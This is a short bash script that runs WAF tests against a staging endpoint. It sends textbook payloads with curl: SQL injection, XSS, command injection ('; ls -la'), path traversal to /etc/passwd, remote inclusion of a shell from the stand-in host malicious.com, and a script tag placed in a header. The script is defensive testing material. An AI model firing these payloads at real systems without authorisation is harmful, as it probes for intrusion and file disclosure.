#!/bin/bash

# Set the target URL for testing
TARGET_URL="https://stg.cloudwithify.online/"  # Replace with your WAF-protected endpoint

# Function to send SQL Injection payload
function test_sql_injection() {
  echo "[+] Testing SQL Injection..."
  curl -X GET "$TARGET_URL?user=admin' OR '1'='1" -H "Content-Type: application/x-www-form-urlencoded"
}

# Function to send Cross-Site Scripting (XSS) payload
function test_xss() {
  echo "[+] Testing Cross-Site Scripting (XSS)..."
  curl -X POST "$TARGET_URL" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "input=<script>alert('XSS')</script>"
}

# Function to send Command Injection payload
function test_command_injection() {
  echo "[+] Testing Command Injection..."
  curl -X POST "$TARGET_URL" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "cmd=; ls -la"
}

# Function to send Local File Inclusion payload
function test_local_file_inclusion() {
  echo "[+] Testing Local File Inclusion (LFI)..."
  curl -X GET "$TARGET_URL?file=../../../../etc/passwd" -H "Content-Type: application/x-www-form-urlencoded"
}

# Function to send Remote File Inclusion payload
function test_remote_file_inclusion() {
  echo "[+] Testing Remote File Inclusion (RFI)..."
  curl -X GET "$TARGET_URL?file=http://malicious.com/shell.php" -H "Content-Type: application/x-www-form-urlencoded"
}

# Function to send HTTP Header Injection payload
function test_header_injection() {
  echo "[+] Testing HTTP Header Injection..."
  curl -X GET "$TARGET_URL" \
    -H "User-Agent: \"<script>alert('Header Injection')</script>\""
}

# Execute tests

test_sql_injection
test_xss
test_command_injection
test_local_file_inclusion
test_remote_file_inclusion
test_header_injection

echo "[+] All tests executed. Review WAF logs for details."